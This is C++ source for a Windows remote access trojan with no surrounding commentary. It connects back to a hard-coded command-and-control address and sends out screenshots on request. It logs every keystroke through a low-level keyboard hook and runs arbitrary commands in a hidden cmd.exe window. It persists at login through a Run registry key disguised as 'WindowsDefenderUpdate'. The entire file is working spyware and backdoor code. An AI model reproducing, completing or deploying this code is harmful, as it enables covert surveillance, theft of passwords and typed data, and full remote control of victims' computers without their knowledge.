#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string>
#include <vector>
#include <gdiplus.h>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")

#define C2_HOST "192.168.1.100"  // Admin IP — degistir
#define C2_PORT 5555

using namespace Gdiplus;

SOCKET globalSock;

void sendScreenshot(SOCKET sock) {
    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    int screenX = GetSystemMetrics(SM_CXSCREEN);
    int screenY = GetSystemMetrics(SM_CYSCREEN);

    HDC hScreen = GetDC(NULL);
    HDC hDC = CreateCompatibleDC(hScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, screenX, screenY);
    SelectObject(hDC, hBitmap);
    BitBlt(hDC, 0, 0, screenX, screenY, hScreen, 0, 0, SRCCOPY);

    IStream* stream = NULL;
    CreateStreamOnHGlobal(NULL, TRUE, &stream);
    Bitmap bitmap(hBitmap, NULL);
    CLSID clsid;
    UINT num = 0, size = 0;
    GetImageEncodersSize(&num, &size);
    ImageCodecInfo* pImageCodecInfo = (ImageCodecInfo*)malloc(size);
    GetImageEncoders(num, size, pImageCodecInfo);
    for (UINT j = 0; j < num; j++) {
        if (wcscmp(pImageCodecInfo[j].MimeType, L"image/jpeg") == 0) {
            clsid = pImageCodecInfo[j].Clsid;
            break;
        }
    }
    free(pImageCodecInfo);

    EncoderParameters encoderParameters;
    encoderParameters.Count = 1;
    encoderParameters.Parameter[0].Guid = EncoderQuality;
    encoderParameters.Parameter[0].Type = EncoderParameterValueTypeLong;
    encoderParameters.Parameter[0].NumberOfValues = 1;
    ULONG quality = 50;
    encoderParameters.Parameter[0].Value = &quality;

    bitmap.Save(stream, &clsid, &encoderParameters);

    HGLOBAL hg = NULL;
    GetHGlobalFromStream(stream, &hg);
    SIZE_T dataSize = GlobalSize(hg);
    LPVOID pData = GlobalLock(hg);

    uint32_t size32 = (uint32_t)dataSize;
    send(sock, (char*)&size32, 4, 0);
    send(sock, (char*)pData, dataSize, 0);

    GlobalUnlock(hg);
    stream->Release();
    DeleteObject(hBitmap);
    DeleteDC(hDC);
    ReleaseDC(NULL, hScreen);
    GdiplusShutdown(gdiplusToken);
}

std::string keyBuffer;
HHOOK keyHook;

LRESULT CALLBACK KeyProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* kbd = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vk = kbd->vkCode;
        if (vk == VK_RETURN) keyBuffer += "[ENTER]";
        else if (vk == VK_BACK) keyBuffer += "[BKSP]";
        else if (vk == VK_SPACE) keyBuffer += " ";
        else {
            BYTE ks[256]; GetKeyboardState(ks);
            char ch;
            if (ToAscii(vk, kbd->scanCode, ks, (LPWORD)&ch, 0) == 1)
                keyBuffer += ch;
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

std::string execCmd(const std::string& cmd) {
    std::string result;
    HANDLE hRead, hWrite;
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    CreatePipe(&hRead, &hWrite, &sa, 0);

    STARTUPINFOA si = {};
    PROCESS_INFORMATION pi = {};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = si.hStdError = hWrite;

    std::string fullCmd = "cmd.exe /c " + cmd;
    CreateProcessA(NULL, (LPSTR)fullCmd.c_str(), NULL, NULL,
                   TRUE, 0, NULL, NULL, &si, &pi);
    CloseHandle(hWrite);
    WaitForSingleObject(pi.hProcess, 10000);

    char buf[4096];
    DWORD bytesRead;
    while (ReadFile(hRead, buf, sizeof(buf)-1, &bytesRead, NULL) && bytesRead > 0) {
        buf[bytesRead] = 0;
        result += buf;
    }
    CloseHandle(hRead);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return result;
}

void sendStr(SOCKET s, const std::string& str) {
    uint32_t len = str.size();
    send(s, (char*)&len, 4, 0);
    send(s, str.c_str(), len, 0);
}

std::string recvStr(SOCKET s) {
    uint32_t len = 0;
    recv(s, (char*)&len, 4, 0);
    if (len == 0 || len > 1024*1024) return "";
    std::string result(len, 0);
    int total = 0;
    while (total < (int)len) {
        int r = recv(s, &result[total], len - total, 0);
        if (r <= 0) break;
        total += r;
    }
    return result;
}

void addPersistence() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    HKEY hKey;
    RegOpenKeyExA(HKEY_CURRENT_USER,
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey);
    RegSetValueExA(hKey, "WindowsDefenderUpdate", 0, REG_SZ,
        (BYTE*)path, strlen(path) + 1);
    RegCloseKey(hKey);
}

void mainLoop(SOCKET sock) {
    keyHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyProc,
                                GetModuleHandle(NULL), 0);

    while (true) {
        std::string cmd = recvStr(sock);
        if (cmd.empty()) break;

        if (cmd == "screenshot") {
            sendScreenshot(sock);
        }
        else if (cmd == "keylog") {
            sendStr(sock, keyBuffer);
            keyBuffer.clear();
        }
        else if (cmd.substr(0, 5) == "shell") {
            std::string command = cmd.substr(6);
            std::string output = execCmd(command);
            sendStr(sock, output);
        }
        else if (cmd == "ping") {
            sendStr(sock, "pong");
        }

        MSG msg;
        while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }
    UnhookWindowsHookEx(keyHook);
}

int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR cmd, int show) {
    addPersistence();

    WSADATA wsa;
    WSAStartup(MAKEWORD(2,2), &wsa);

    while (true) {
        SOCKET sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
        struct sockaddr_in server;
        server.sin_family = AF_INET;
        server.sin_port = htons(C2_PORT);
        inet_pton(AF_INET, C2_HOST, &server.sin_addr);

        if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == 0) {
            mainLoop(sock);
        }
        closesocket(sock);
        Sleep(5000);
    }
    return 0;
}
